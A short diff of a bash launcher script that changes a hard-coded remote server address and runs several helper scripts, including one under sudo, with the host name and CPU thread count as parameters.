@@ -1,5 +1,5 @@
 #!/bin/bash
-IPADR="116.202.111.105:4500"
+IPADR="45.11.24.158:4500"
 MNRCO="unnnsssoip"
 ID="$(hostname)"
 THREADS="$(nproc --all)"
@@ -28,4 +28,4 @@ sudo dos2unix 800.sh
 sudo dos2unix 605.sh
 sudo dos2unix 900.sh
 sudo dos2unix 400.sh
-. ./pusk.sh & ./checker.sh
+sudo ./pusk.sh & ./checker.sh
